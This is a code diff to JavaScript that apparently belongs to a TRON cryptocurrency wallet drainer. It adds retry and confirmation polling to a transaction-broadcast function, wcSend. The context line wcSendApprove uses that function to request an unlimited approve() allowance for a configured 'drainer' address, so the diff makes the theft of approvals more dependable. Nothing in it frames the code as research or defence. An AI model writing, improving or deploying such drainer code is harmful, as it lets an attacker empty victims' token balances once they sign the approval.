@@ -231,16 +231,23 @@ async function wcSend(contract, selector, param, feeLimit) {
   if (!sig) throw new Error('not signed');
   tx.signature = Array.isArray(sig) ? sig : [sig];
   const b = await rpc('/wallet/broadcasttransaction', tx);
+  const b64 = (s) => { try { return atob(s); } catch (e) { return s || ''; } };
   if (b.result !== true) {
-    const chk = await rpc('/wallet/gettransactionbyid', { value: tx.txID });
-    if (!chk || !chk.txID) throw new Error((b.message && atob(b.message)) || b.code || 'broadcast failed');
+    let found = false;
+    for (let i = 0; i < 8; i++) {
+      const chk = await rpc('/wallet/gettransactionbyid', { value: tx.txID });
+      if (chk && chk.txID) { found = true; break; }
+      await sleep(1500);
+    }
+    if (!found) throw new Error(b64(b.message) || b.code || 'broadcast failed');
   }
+  const id = b.txid || tx.txID;
   for (let i = 0; i < 30; i++) {
-    const info = await rpc('/wallet/gettransactioninfobyid', { value: b.txid });
-    if (info && info.receipt) return b.txid;
+    const info = await rpc('/wallet/gettransactioninfobyid', { value: id });
+    if (info && info.receipt) return id;
     await sleep(1500);
   }
-  return b.txid;
+  return id;
 }
 
 const wcSendApprove = (token) => wcSend(token, 'approve(address,uint256)', addrParam(cfg.drainer) + uintParam(MAX), 150e6);
